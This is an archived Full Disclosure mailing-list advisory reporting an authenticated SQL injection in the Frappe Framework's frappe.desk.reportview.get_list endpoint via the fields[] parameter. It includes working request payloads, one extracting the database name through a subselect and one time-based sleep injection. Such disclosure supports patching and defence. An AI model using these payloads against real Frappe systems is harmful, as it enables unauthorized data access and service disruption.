---
title: Structured Query Language Injection in	frappe.desk.reportview.get_list Endpoint in Frappe Framework
url: https://seclists.org/fulldisclosure/2025/May/22
source: Full Disclosure
date: 2025-05-29
fetch_date: 2025-10-06T22:37:04.187126
---

# Structured Query Language Injection in	frappe.desk.reportview.get_list Endpoint in Frappe Framework

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](21)
[By Date](date.html#22)
[![Next](/images/right-icon-16x16.png)](23)

[![Previous](/images/left-icon-16x16.png)](21)
[By Thread](index.html#22)
[![Next](/images/right-icon-16x16.png)](23)

![](/shared/images/nst-icons.svg#search)

# Structured Query Language Injection in frappe.desk.reportview.get\_list Endpoint in Frappe Framework

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Tue, 27 May 2025 17:04:14 -0400

---

```
ï»¿
An authenticated SQL injection vulnerability exists in the frappe.desk.reportview.get_list API of the Frappe Framework,
affecting versions v15.56.1. The vulnerability stems from improper sanitization of the fields[] parameter, which allows
low-privileged users to inject arbitrary SQL expressions directly into the SELECT clause.

Sample Structured Query Language Injection:

Request:

GET
/api/method/frappe.desk.reportview.get_list?fields=%5B%22salary_component_abbr%2c(SELECT%20database())%20AS%20current_db%22%5D&doctype=Salary%20Component&limit=20&_=1748066407934
 HTTP/2
Host: --host--
Cookie: ******
--snip--

Response:

HTTP/2 200 OK

{"message":[{"salary_component_abbr":"H***","current_db":"_**************"},
--snip--

Time based attack:

Request

GET
/api/method/frappe.desk.reportview.get_list?fields=[%22salary_component_abbr%2c(select*from(select(sleep(200)))a)%22]&doctype=Salary%20Component&limit=20&_=1748066407933
 HTTP/2
Host: --host--
Cookie: ******
--snip--

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](21)
[By Date](date.html#22)
[![Next](/images/right-icon-16x16.png)](23)

[![Previous](/images/left-icon-16x16.png)](21)
[By Thread](index.html#22)
[![Next](/images/right-icon-16x16.png)](23)

### Current thread:

* **Structured Query Language Injection in frappe.desk.reportview.get\_list Endpoint in Frappe Framework** *Ron E (May 27)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")